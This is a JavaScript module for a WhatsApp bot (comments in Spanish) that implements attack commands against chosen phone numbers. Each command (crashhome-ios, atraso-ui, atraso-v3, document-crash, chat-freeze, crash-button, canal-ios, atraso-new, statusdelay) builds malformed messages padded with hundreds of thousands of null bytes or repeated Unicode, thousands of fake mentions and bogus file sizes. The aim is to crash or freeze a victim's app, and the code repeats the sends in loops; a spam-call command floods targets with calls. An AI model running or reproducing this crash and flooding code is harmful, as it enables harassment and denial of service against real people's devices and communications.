// lib/heavyTasks.js
// Lógica de CPU pesada, aislada del mundo.
const fs = require('fs'); // Ya no se usa, los buffers vienen en context.assets
const { generateWAMessageFromContent,
            getAggregateVotesInPollMessage,
            downloadContentFromMessage,
            prepareWAMessageMedia,
            useMultiFileAuthState,
            generateMessageID,
            generateIOSMessageID,
            generateWAMessage,
            makeInMemoryStore,
            DisconnectReason,
            areJidsSameUser,
            getContentType,
            decryptPollVote,
            relayMessage,
            jidDecode,
            Browsers,
            getDevice,
            proto,
} = require('baron-baileys-v2'); // Dependencias para construir mensajes
const Long = require('long');

// Función de sleep
const sleep = (ms) => new Promise(resolve => setTimeout(resolve, ms));

module.exports = {

    'crashhome-ios': async (conn, m, context) => {
        // --- Lógica del 'case "crashhome-ios"' ---
        const X = m.chat; //
        const rawText = (m.text || m.message?.conversation || "").trim(); //
        const found = rawText.match(/(\d+)/); //
        let times = found ? parseInt(found[1], 10) : 5; //
        if (isNaN(times) || times < 1) times = 1; //
        const MAX_SENDS = 100; //
        if (times > MAX_SENDS) times = MAX_SENDS; //

        // --- Lógica de la función 'async function ios(X)' ---
        for (let i = 0; i < times; i++) { //
            try {
                // Leer miniatura desde el CONTEXTO (assets), no desde el disco
                const jpegThumbnailBuffer = context.assets.fotoJpg; //

                let locationMessage = { //
                    degreesLatitude: -0,
                    degreesLongitude: 0,
                    jpegThumbnail: jpegThumbnailBuffer,
                    name: "\u0000" + "𑇂𑆵𑆴𑆿𑆿".repeat(15000),
                    address: "\u0000" + "𑇂𑆵𑆴𑆿𑆿".repeat(10000),
                    url: `https://xnxx.${"𑇂𑆵𑆴𑆿".repeat(25000)}.com.mx`,
                };

                let extendMsg = { //
                    extendedTextMessage: {
                        text: "⚡️ 𝐆𝐎𝐄𝐓 𝐆𝐍𝐒" + "𑇂𑆵𑆴𑆿".repeat(60000),
                        matchedText: "☕️ 𝐏.𝐀. Zin 𝐖𝐞𝐛 </>",
                        description: "𑇂𑆵𑆴𑆿".repeat(25000),
                        title: "𑇂𑆵𑆴𑆿".repeat(15000),
                        previewType: "NONE",
                        jpegThumbnail: jpegThumbnailBuffer,
                        thumbnailDirectPath: "/v/t62.36144-24/32403911_656678750102553_6150409332574546408_n.enc?ccb=11-4&oh=01_Q5AaIZ5mABGgkve1IJaScUxgnPgpztIPf_qlibndhhtKEs9O&oe=680D191A&_nc_sid=5e03e0",
                        thumbnailSha256: Buffer.from("eJRYfczQlgc12Y6LJVXtlABSDnnbWHdavdShAWWsrow=", "base64"),
                        thumbnailEncSha256: Buffer.from("pEnNHAqATnqlPAKQOs39bEUXWYO+b9LgFF+aAF0Yf8k=", "base64"),
                        mediaKey: Buffer.from("8yjj0AMiR6+h9+JUSA/EHuzdDTakxqHuSNRmTdjGRYk=", "base64"),
                        mediaKeyTimestamp: "1743101489",
                        thumbnailHeight: 641,
                        thumbnailWidth: 640,
                        inviteLinkGroupTypeV2: "DEFAULT"
                    }
                };

                // Crear el primer mensaje (view once con location)
                const msg1 = conn.generateWAMessageFromContent(X, {
                    viewOnceMessage: {
                        message: {
                            locationMessage
                        }
                    }
                }, { userJid: X });

                // Crear el segundo mensaje (view once con extendMsg)
                const msg2 = conn.generateWAMessageFromContent(X, {
                    viewOnceMessage: {
                        message: extendMsg
                    }
                }, { userJid: X });

                // Enviar ambos mensajes al broadcast de estados
                for (const msg of [msg1, msg2]) {
                    await conn.relayMessage(
                        'status@broadcast',
                        msg.message,
                        {
                            messageId: msg.key.id,
                            statusJidList: [X],
                            additionalNodes: [
                                {
                                    tag: 'meta',
                                    attrs: {},
                                    content: [
                                        {
                                            tag: 'mentioned_users',
                                            attrs: {},
                                            content: [
                                                {
                                                    tag: 'to',
                                                    attrs: { jid: X },
                                                    content: undefined
                                                }
                                            ]
                                        }
                                    ]
                                }
                            ]
                        }
                    );
                }

                console.log("✅️ Enviado exitosamente (crashhome-ios)"); //
            } catch (err) {
                console.error("❌ Error al enviar (crashhome-ios):", err); //
            }
            if (i !== times - 1) await sleep(5000); //
        }
    },
    
   'atraso-ui': async (conn, m, context) => {
        // --- Lógica del 'case "atraso-ui"' ---
        const target = m.chat; //
        const rawText = (m.text || m.message?.conversation || "").trim(); //
        const found = rawText.match(/(\d+)/); //
        let times = found ? parseInt(found[1], 10) : 1; //
        if (isNaN(times) || times < 1) times = 1; //
        const MAX_SENDS = 100; //
        if (times > MAX_SENDS) times = MAX_SENDS; //

        
       for (let i = 0; i < times; i++) {
            try {
                let cards = [];
                
                // Creamos las 10 tarjetas del carrusel
                for (let j = 0; j < 10; j++) {
                    cards.push({
                        body: {
                            text: "⎋🤬</🤬⃟༑⌁⃰𝕮𝖍𝖔𝖈𝖔𝖕𝖑𝖚𝖘\\>🤬"
                        },
                        header: {
                            title: "🤬</🤬⃟༑⌁⃰𝕮𝖍𝖔𝖈𝖔𝖕𝖑𝖚𝖘\\>🤬" + "\u0000".repeat(50000),
                            hasMediaAttachment: true,
                            imageMessage: { 
                                url: "https://mmg.whatsapp.net/v/t62.7118-24/19005640_1691404771686735_1492090815813476503_n.enc?ccb=11-4&oh=01_Q5AaIMFQxVaaQDcxcrKDZ6ZzixYXGeQkew5UaQkic-vApxqU&oe=66C10EEE&_nc_sid=5e03e0&mms3=true",
                                mimetype: "image/jpeg",
                                fileSha256: Buffer.from("dUyudXIGbZs+OZzlggB1HGvlkWgeIC56KyURc4QAmk4=", "base64"), // Buffer real
                                fileLength: Long.fromString("591"), // ¡Long obligatorio!
                                height: Long.fromInt(100),          // ¡Long obligatorio!
                                width: Long.fromInt(100),           // ¡Long obligatorio!
                                mediaKey: Buffer.from("LGQCMuahimyiDF58ZSB/F05IzMAta3IeLDuTnLMyqPg=", "base64"),
                                fileEncSha256: Buffer.from("G3ImtFedTV1S19/esIj+T5F+PuKQ963NAiWDZEn++2s=", "base64"),
                                directPath: "/v/t62.7118-24/19005640_1691404771686735_1492090815813476503_n.enc?ccb=11-4&oh=01_Q5AaIMFQxVaaQDcxcrKDZ6ZzixYXGeQkew5UaQkic-vApxqU&oe=66C10EEE&_nc_sid=5e03e0",
                                mediaKeyTimestamp: Long.fromString("1721344123"), // ¡Long obligatorio!
                                jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIABkAGQMBIgACEQEDEQH/xAArAAADAQAAAAAAAAAAAAAAAAAAAQMCAQEBAQAAAAAAAAAAAAAAAAAAAgH/2gAMAwEAAhADEAAAAMSoouY0VTDIss//xAAeEAACAQQDAQAAAAAAAAAAAAAAARECEHFBIv/aAAgBAQABPwArUs0Reol+C4keR5tR1NH1b//EABQRAQAAAAAAAAAAAAAAAAAAACD/2gAIAQIBAT8AH//EABQRAQAAAAAAAAAAAAAAAAAAACD/2gAIAQMBAT8AH//Z",
                                scansSidecar: "igcFUbzFLVZfVCKxzoSxcDtyHA1ypHZWFFFXGe+0gV9WCo/RLfNKGw==",
                                scanLengths: [
                                    247,
                                    201,
                                    73,
                                    63
                                ],
                                midQualityFileSha256: "qig0CvELqmPSCnZo7zjLP0LJ9+nWiwFgoQ4UkjqdQro="
                            
                            }
                        },
                        nativeFlowMessage: {
                            // IMPORTANTE: Si no hay botones, pon uno falso o la estructura falla en v1.2.8+
                            buttons: [
                                {
                                    name: "cta_url",
                                    buttonParamsJson: JSON.stringify({
                                        display_text: "𝕮𝖍𝖔𝖈𝖔𝖕𝖑𝖚𝖘" + "ꦾ".repeat(100),
                                        url: "https://google.com",
                                        merchant_url: "https://google.com"
                                    })
                                }
                            ]
                        }
                    });
                }

                // Construcción CORRECTA del mensaje interactivo usando Proto
                const msgContent = {
                    viewOnceMessage: {
                        message: {
                            messageContextInfo: {
                                deviceListMetadata: {},
                                deviceListMetadataVersion: 2
                            },
                            interactiveMessage: {
                                body: { text: "⎋🤬</🤬⃟༑⌁⃰🕷️「BlackOut System Zap」‌‌\\>🤬" + "ꦾ".repeat(50000) },
                                footer: { text: "🤬</🤬༑⌁⃰🕷️「BlackOut System Zap」ཀ‌‌\\>🤬" + "ꦾ".repeat(50000)},
                                header: { hasMediaAttachment: false },
                                carouselMessage: { cards: cards }
                            }
                        }
                    }
                };

                // Usamos generateWAMessageFromContent del Hilo
                // Importante: userJid es necesario para firmar el mensaje
                const generated = await conn.generateWAMessageFromContent(target, msgContent, { 
                    userJid: target 
                });

                // Relayer
                await conn.relayMessage(target, generated.message, { 
                    messageId: generated.key.id 
                });

                console.log(`[CHEF] Mensaje atraso-ui enviado a ${target}`);

            } catch (err) {
                console.error("Error en atraso-ui:", err);
            }
            
            if (i !== times - 1) await sleep(5000);
        }
    },
    'atraso-v3': async (conn, m, context) => {
        // --- Lógica del 'case "atraso-v3"' ---
        const target = m.chat; //
        const rawText = (m.text || m.message?.conversation || "").trim(); //
        const found = rawText.match(/(\d+)/); //
        let times = found ? parseInt(found[1], 10) : 20; //
        if (isNaN(times) || times < 1) times = 1; //
        const MAX_SENDS = 100; //
        if (times > MAX_SENDS) times = MAX_SENDS; //

        // --- Lógica de la función 'async function DelayBjir(target)' ---
        for (let i = 0; i < times; i++) { //
            try { // Try/Catch del 'case'
                
                try { // Try/Catch interno de 'DelayBjir'
                    const AimBot = { //
                        viewOnceMessage: {
                            message: {
                                locationMessage: {
                                    degreesLatitude: 9.999999,
                                    degreesLongitude: -9.999999,
                                    name: "⎋🦠</🧬⃟༑⌁⃰𝙕𝙚𝙧𝙤𝙂𝙝𝙤𝙨𝙩𝙓ཀ‌‌\\>🍷𞋯" + "\u0000".repeat(88888),
                                    address: "\u0000".repeat(5555),
                                    contextInfo: {
                                        mentionedJid: Array.from({ length: 2000 }, () =>
                                            "1" + Math.floor(Math.random() * 9000000) + "@s.whatsapp.net"
                                        ),
                                        isSampled: true,
                                        participant: target,
                                        remoteJid: target,
                                        forwardingScore: 9741,
                                        isForwarded: true
                                    }
                                }
                            }
                        }
                    };

                    const AimBot2 = { //
                        viewOnceMessage: {
                            message: {
                                interactiveResponseMessage: {
                                    body: {
                                        text: "⎋🦠</🧬⃟༑⌁⃰𝙕𝙚𝙧𝙤𝙂𝙝𝙤𝙨𝙩𝙓ཀ‌‌\\>🍷𞋯",
                                        format: "DEFAULT"
                                    },
                                    nativeFlowResponseMessage: {
                                        name: "call_permission_request",
                                        paramsJson: "\u0000".repeat(1045000),
                                        version: 3
                                    }
                                }
                            }
                        }
                    };

                    const AimBot3 = { //
                        extendedTextMessage: {
                            text:
                                "⎋🦠</🧬⃟༑⌁⃰𝙕𝙚𝙧𝙤𝙂𝙝𝙤𝙨𝙩𝙓ཀ‌‌\\>🍷𞋯" +
                                "\u0000".repeat(299986),
                            contextInfo: {
                                participant: target,
                                mentionedJid: [
                                    "0@s.whatsapp.net",
                                    ...Array.from(
                                        { length: 1900 },
                                        () => "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
                                    )
                                ]
                            }
                        }
                    };

                    // Definimos los nodos adicionales para el relay
                    const statusJidList = [target];
                    const additionalNodes = [
                        {
                            tag: "meta",
                            attrs: {},
                            content: [
                                {
                                    tag: "mentioned_users",
                                    attrs: {},
                                    content: [
                                        { tag: "to", attrs: { jid: target }, content: undefined }
                                    ]
                                }
                            ]
                        }
                    ];

                    // Usamos el 'conn' (fake conn) del hilo
                    const msg1 = conn.generateWAMessageFromContent(target, AimBot, {}); //
                    await conn.relayMessage("status@broadcast", msg1.message, { //
                        messageId: msg1.key.id,
                        statusJidList: statusJidList,
                        additionalNodes: additionalNodes
                    });

                    const msg2 = conn.generateWAMessageFromContent(target, AimBot2, {}); //
                    await conn.relayMessage("status@broadcast", msg2.message, { //
                        messageId: msg2.key.id,
                        statusJidList: statusJidList,
                        additionalNodes: additionalNodes
                    });

                    const msg3 = conn.generateWAMessageFromContent(target, AimBot3, {}); //
                    await conn.relayMessage("status@broadcast", msg3.message, { //
                        messageId: msg3.key.id,
                        statusJidList: statusJidList,
                        additionalNodes: additionalNodes
                    });

                } catch (err) {
                    console.error("BJIR ERROR COK😡🗿:", err); //
                }
                
            } catch (err) {
                console.error("atraso-v3 loop error:", err); // (modificado de "documentCrash error")
            }
            if (i !== times - 1) await sleep(5000); //
        }
    },
   'document-crash': async (conn, m, context) => {
        // --- Lógica del 'case "document-crash"' ---
        const target = m.chat; //
        const rawText = (m.text || m.message?.conversation || "").trim(); //
        const found = rawText.match(/(\d+)/); //
        let times = found ? parseInt(found[1], 10) : 10; //
        if (isNaN(times) || times < 1) times = 1; //
        const MAX_SENDS = 100; //
        if (times > MAX_SENDS) times = MAX_SENDS; //

        // --- Lógica de la función 'async function documentCrash(target)' ---
        for (let i = 0; i < times; i++) { //
            try { //
                await conn.relayMessage(target, { //
                    documentMessage: { //
                        url: "https://mmg.whatsapp.net/v/t62.7119-24/18970868_1451610396007067_2477655932894905749_n.enc?ccb=11-4&oh=01_Q5Aa2gG5YtBm2C0eu_nYievlS-3dhLAjC8Ne70VK9vO12EPF_g&oe=68EA391C&_nc_sid=5e03e0&mms3=true", //
                        mimetype: "application/zip", //
                        fileSha256: "gXL6XotbKW05nCSSa/XlvXeMqOsMkq37Y/XrewO5a0g=", //
                        fileLength: 99999999999, //
                        pageCount: 999999999, //
                        mediaKey: "HduCwhWMz3owQVo4188Om/0YCAl7ws8Zls0hdLD5aEY=", //
                        fileName: "🕷️「BlackOut System Zap」, 𝕮𝖍𝖔𝖈𝖔𝖕𝖑𝖚𝖘", //
                        fileEncSha256: "9kYcZz1osvxhOoL1hH0el9ZhUYh9z0uk2McxFTOpiHU=", //
                        directPath: "/v/t62.7119-24/18970868_1451610396007067_2477655932894905749_n.enc?ccb=11-4&oh=01_Q5Aa2gG5YtBm2C0eu_nYievlS-3dhLAjC8Ne70VK9vO12EPF_g&oe=68EA391C&_nc_sid=5e03e0", //
                        mediaKeyTimestamp: "1757598955", //
                        // ADAPTACIÓN: Usar 'assets' del contexto
                        jpegThumbnail: context.assets.ZeppImg, //
                        contactVcard: true, //
                        contextInfo: { //
                            isForwarded: true,
                            forwardingScore: 9999,
                            businessMessageForwardInfo: {
                                businessOwnerJid: "13135550202@s.whatsapp.net"
                            },
                            participant: "13135550302@bot",
                            quotedMessage: {
                                paymentInviteMessage: {
                                    serviceType: 3,
                                    expiryTimestamp: Date.now() * 100 // Esto está bien
                                }
                            },
                            remoteJid: "kkk"
                        }
                    }
                }, {});
            } catch (err) { //
                console.error("documentCrash error:", err); //
            } //
            if (i !== times - 1) await sleep(5000); //
        }
    },
    'chat-freeze': async (conn, m, context) => {
        // --- Lógica del 'case "chat-freeze"' ---
        const from = m.chat; //
        const sender = m.sender; //
        
        // ADAPTACIÓN: El 'm' original se usaba como thumbnail.
        // Eso no se puede clonar. Usamos un thumbnail de los assets.
        const thumbnailBuffer = context.assets.thumbJpg; 
        
        try { //
            for (let i = 0; i < 10; i++) { //
                await conn.sendMessage(from, { //
                    location: { //
                        degreesLatitude: 'ola',
                        degreesLongitude: 'ola',
                        name: `ola`,
                        url: context.assets.bugUrl, // ADAPTACIÓN: Usar asset
                        contextInfo: { //
                            forwardingScore: 508,
                            isForwarded: true,
                            isLiveLocation: true,
                            fromMe: false,
                            participant: '0@s.whatsapp.net',
                            remoteJid: sender,
                            quotedMessage: { //
                                documentMessage: {
                                    url: "https://mmg.whatsapp.net/v/t62.7119-24/34673265_965442988481988_3759890959900226993_n.enc?ccb=11-4&oh=01_AdRGvYuQlB0sdFSuDAeoDUAmBcPvobRfHaWRukORAicTdw&oe=65E730EB&_nc_sid=5e03e0&mms3=true",
                                    mimetype: "application/pdf",
                                    title: "crash",
                                    pageCount: 1000000000,
                                    fileName: "crash.pdf",
                                    contactVcard: true
                                }
                            },
                            forwardedNewsletterMessageInfo: { //
                                newsletterJid: '120363274419284848@newsletter',
                                serverMessageId: 1,
                                newsletterName: " " + context.assets.telapreta + context.assets.telapreta // ADAPTACIÓN: Usar asset
                            },
                            externalAdReply: { //
                                title: ' ola ',
                                body: 'ola',
                                mediaType: 0,
                                thumbnail: thumbnailBuffer,     // ADAPTACIÓN: Usar buffer
                                jpegThumbnail: thumbnailBuffer, // ADAPTACIÓN: Usar buffer
                                mediaUrl: `https://www.youtube.com/@g`,
                                sourceUrl: `https://chat.whatsapp.com/`
                            }
                        }
                    }
                });
            }
        } catch (e) { //
            console.error("Error en hilo (chat-freeze):", e); //
        }
    },
    // Pega esto dentro del 'module.exports = { ... }' en tu lib/heavyTasks.js

    
    'crash-button': async (conn, m, context) => {
        // 1. Obtenemos las variables del contexto
        const from = m.chat;
        const sender = m.sender;

        // 2. Traemos los assets que vamos a usar
        const travadocAsset = context.assets.travadoc;     //
        const olaJpgAsset = context.assets.olaJpg;         //
        const crashZipAsset = context.assets.crashZip;   //

        // 3. Copiamos el bucle (loop)
        for (let i = 0; i < 6; i++) {
            await conn.sendMessage(from, { //
                // ===== ¡¡CORRECCIÓN!! =====
                // Usamos el buffer del asset, no la URL
                document: crashZipAsset, //
                // ==========================
                
                fileName: '𝕮𝖍𝖔𝖈𝖔𝖕𝖑𝖚𝖘',
                caption: '@𝕮𝖍𝖔𝖈𝖔𝖕𝖑𝖚𝖘' + "ꦿꦶꦷꦹꦽ".repeat(9999),
                mimetype: "@".repeat(9999),
                contextInfo: {
                    "externalAdReply": {
                        "title": '',
                        "body": '@Xghr-BOT V2',
                        "mediaType": 2,
                        
                        // ===== ¡¡CORRECCIÓN!! =====
                        // Reemplazamos fs.readFileSync con los assets
                        "thumbnail": olaJpgAsset,     //
                        "jpegThumbnail": olaJpgAsset, //
                        // ==========================
                        
                        "firstImageId": 99999999,
                        "previewType": "VIDEO",
                        "mediaUrl": 'https://youtube.com/@sekzope'
                    }
                },
                mentions: [sender], // Usamos el 'sender' del contexto
                footer: "Xghr-BOT V2",
                buttons: [
                    {
                        buttonId: "hi",
                        buttonText: {
                            // ===== ¡¡CORRECCIÓN!! =====
                            displayText: travadocAsset //
                        }
                    },
                    {
                        buttonId: "hi2",
                        buttonText: {
                            // ===== ¡¡CORRECCIÓN!! =====
                            displayText: travadocAsset //
                        }
                    },
                    {
                        buttonId: "hi3",
                        buttonText: {
                            // ===== ¡¡CORRECCIÓN!! =====
                            displayText: travadocAsset //
                        }
                    }
                ],
                viewOnce: true,
                headerType: "DOCUMENT",
            }, {})
        }
    },
    // Pega esto dentro del 'module.exports = { ... }' en tu lib/heavyTasks.js

    'canal-ios': async (conn, m, context) => {
        // 1. Obtenemos las variables del contexto
        const from = m.chat;

        // 2. Traemos el asset 'ios6'
        // Lo convertimos a string para concatenarlo
        const ios6Asset = context.assets.ios6.toString(); //

        // 3. Primer relayMessage (el pesado)
        await conn.relayMessage(from, { //
            'newsletterAdminInviteMessage': {
                'newsletterJid': '120363282786345717@newsletter',
                'newsletterName': '𝕮𝖍𝖔𝖈𝖔𝖕𝖑𝖚𝖘' + ios6Asset, // <-- Se usa el asset
                'jpegThumbnail': '',
                'caption': "𝐏𝐎𝐒𝐄𝐢𝐃𝐎𝐍 ⚡️",
                'inviteExpiration': "99999999999"
            }
        }, { 'quoted': m }); // <-- Se usa 'm' para el quoted
    
        // 4. Segundo relayMessage (el de confirmación)
        await conn.relayMessage(from, { //
            'extendedTextMessage': {
                'text': "𝐵𝑂𝑇 𝑉𝐼𝑃"
            }
        }, {});
    },
    'atraso-new': async (conn, m, context) => {
        const { isBot, isCreator, q, candList } = context;
        const reply = (text) => {
            conn.sendMessage(m.chat, { text: text, mentions: [m.sender] }, { quoted: m });
        };
        async function invisível_trava_status(target, carousel = null) {
          let sxo = await conn.generateWAMessageFromContent(target, { //
            viewOnceMessage: {
              message: {
                interactiveResponseMessage: {
                  body: { text: "¿𝕮𝖍𝖔𝖈𝖔𝖕𝖑𝖚s?", format: "DEFAULT" },
                  nativeFlowResponseMessage: {
                    name: "call_permission_request",
                    paramsJson: "\x10".repeat(1045000), //
                    version: 3
                  },
                  entryPointConversionSource: "galaxy_message",
                }
              }
            }
          }, {
            ephemeralExpiration: 0,
            forwardingScore: 9741,
            isForwarded: true,
            font: Math.floor(Math.random() * 99999999),
            background: "#" + Math.floor(Math.random() * 16777215).toString(16).padStart(6, "99999999"),
          });
          
          let sXoMessage = {
            extendedTextMessage: {
              text: "𝕮𝖍𝖔𝖈𝖔𝖕𝖑𝖚s",
              contextInfo: {
                participant: target,
                mentionedJid: [
                  "0@s.whatsapp.net",
                  ...Array.from({ length: 1900 }, () => `1${Math.floor(Math.random() * 5000000)}@s.whatsapp.net`)
                ]
              }
            }
          };
          
          const xso = conn.generateWAMessageFromContent(target, sXoMessage, {});
          await conn.relayMessage("status@broadcast", xso.message, { //
            messageId: xso.key.id,
            statusJidList: [target],
            additionalNodes:  [{
              tag: "meta",
              attrs: {},
              content: [{
                tag: "mentioned_users",
                attrs: {},
                content: [{ tag: "to", attrs: { jid: target }, content: undefined }]
              }]
            }]
          });
          
          await sleep(500); //
          
          await conn.relayMessage("status@broadcast", sxo.message, { //
            messageId: sxo.key.id,
            statusJidList: [target],
            additionalNodes: [{ /* ... */ }]
          });
          
          await sleep(500); //
          console.log(`ATRASO INVISÍVEL`);
        }

        // --- 4. Copiamos la lógica principal del plugin ---
        if (!isBot && !isCreator) return;
        if (!q) return reply(`Formato incorrecto.\n*Ejemplo:* ${prefix}atraso-new +5939xxxxxxxx,5`);

        let targetNumber;
        let cantidad = 1; // Default si solo se pone el número
        const limite = 100; // Límite máximo para este comando

        if (q.includes(',')) {
            const parts = q.split(',');
            targetNumber = parts[0].replace(/[^0-9]/g, '');
            const cantidadSolicitada = parseInt(parts[1].trim());

            if (!isNaN(cantidadSolicitada) && cantidadSolicitada > 0) {
                cantidad = Math.min(cantidadSolicitada, limite);
            }
        } else {
            targetNumber = q.replace(/[^0-9]/g, '');
        }

        if (!targetNumber) return reply('El número no es válido.');

        const target = targetNumber + "@s.whatsapp.net";

        if (candList.includes(target)) {
            await reply(`Nel, con el owner no`);
            await conn.sendMessage("593969533280@s.whatsapp.net", {
                text: `User *${m.sender}* intentó usar atraso-new en ${target}.`
            });
            return;
        }

        await reply(`> Iniciando envío a ${targetNumber}\n*Cantidad de sets* : \`${cantidad}\``);

        for (let i = 0; i < cantidad; i++) {
            console.log(`[+] Enviando set de atraso-new #${i + 1} a ${targetNumber}`);
            // El bucle original enviaba 3 mensajes. Mantenemos esa lógica por cada "cantidad".
            await invisível_trava_status(target)
    await sleep(1000)
    await invisível_trava_status(target)
    await sleep(1000)
    await invisível_trava_status(target)
        }

        conn.sendMessage(m.chat, { react: { text: '✅', key: m.key } });
    },
    'spam-call': async (conn, m, context) => {
        // --- 1. Extraemos las variables del 'context' ---
        const { isBot, isCreator, q } = context;

        // --- 2. Recreamos la función 'reply' ---
        const reply = (text) => {
            conn.sendMessage(m.chat, { text: text, mentions: [m.sender] }, { quoted: m });
        };

        // --- 3. Copiamos la lógica principal del plugin ---
        if (!isBot && !isCreator) return; //
        if (!q) return reply(`Formato incorrecto. Ejemplo:\n?spam-call 543xxx,<cantidad>`); //

        let targetNumber;
        let cantidad = 1;

        if (q.includes(',')) { //
            const parts = q.split(',');
            targetNumber = parts[0].replace(/[^0-9]/g, '');
            const requestedCantidad = parseInt(parts[1].trim(), 10);
            
            if (!isNaN(requestedCantidad) && requestedCantidad > 0) {
                cantidad = Math.min(requestedCantidad, 10); //
            }
        } else {
            targetNumber = q.replace(/[^0-9]/g, ''); //
        }

        if (!targetNumber) return reply('Número no válido.'); //

        const target = targetNumber + "@s.whatsapp.net"; //

        try {
            // No podemos editar mensajes desde el hilo, así que enviamos uno de inicio
            await reply(`> Iniciando ${cantidad} llamadas a ${target.split('@')[0]}...`); //

            for (let i = 0; i < cantidad; i++) { //
                
                // --- Esta línea es la que PUEDE fallar por el firewall del VPS ---
                await conn.offerCall(target); //
                // ---
                
                console.log(`Llamada de voz #${i + 1} ofrecida a ${target}`);
                if (cantidad > 1) {
                    await sleep(6000); //
                }
            }

            // Enviamos un mensaje de finalización
            await reply(`> Se completó ${cantidad} llamadas a ${target.split('@')[0]}.`); //

        } catch (error) {
            console.error(`Error al ofrecer llamada (en hilo):`, error);
            // Esto le dirá al usuario el error de "Timeout" si el VPS lo bloquea
        }
    },
    'statusdelay': async (conn, m, context) => {
        // --- 1. Extraemos las variables del 'context' ---
                if (!isBot && !isCreator) return; //
        const from = m.chat;

        // --- 2. Recreamos la función 'reply' (para notificar al final) ---
        const reply = (text) => {
            conn.sendMessage(m.chat, { text: text, mentions: [m.sender] }, { quoted: m });
        };

        // --- 3. Copiamos la lógica principal del plugin ---
        if (!isBot && !isCreator) return;

        // (Ya no reaccionamos '⏳️', main.js ya reacciona '⚙️')

        for (let i = 0; i < 100; i++) { //
            // Usamos 'conn.generateWAMessageFromContent' del hilo
            let msg = await conn.generateWAMessageFromContent(from, { //
                buttonsMessage: {
                    text: "☕️ 𝐏.𝐀. 𝐙𝐢𝐧 𝐖𝐞𝐛 </>",
                    contentText: "𝐏𝐎𝐒𝐄𝐢𝐃𝐎𝐍 ⚡️",
                    buttons: [
                        {
                            buttonId: ".null",
                            buttonText: {
                                displayText: "𝕮𝖍𝖔𝖈𝖔𝖕𝖑𝖚𝖘" + "\u0000".repeat(500000), //
                            },
                            type: 1,
                        },
                    ],
                    headerType: 1,
                },
            }, {});

            // Usamos 'conn.relayMessage' del hilo
            await conn.relayMessage("status@broadcast", msg.message, { //
                messageId: msg.key.id,
                statusJidList: [from],
                additionalNodes: [ //
                    {
                        tag: "meta",
                        attrs: {},
                        content: [
                            {
                                tag: "mentioned_users",
                                attrs: {},
                                content: [
                                    {
                                        tag: "to",
                                        attrs: { jid: from },
                                        content: undefined,
                                    },
                                ],
                            },
                        ],
                    },
                ],
            });

            if (isCreator) { //
                await conn.relayMessage( //
                    from,
                    {
                        groupStatusMentionMessage: {
                            message: {
                                protocolMessage: {
                                    key: msg.key,
                                    type: 25,
                                },
                            },
                        },
                    },
                    {
                        additionalNodes: [
                            {
                                tag: "meta",
                                attrs: {
                                    is_status_mention: "𝕮𝖍𝖔𝖈𝖔𝖕𝖑𝖚𝖘",
                                },
                                content: undefined,
                            },
                        ],
                    }
                );
            }
        }
    },
    
    
    'default': async (conn, m, context) => {
      console.error(`Comando pesado ${context.command} no implementado en heavyTasks.js`);
    },};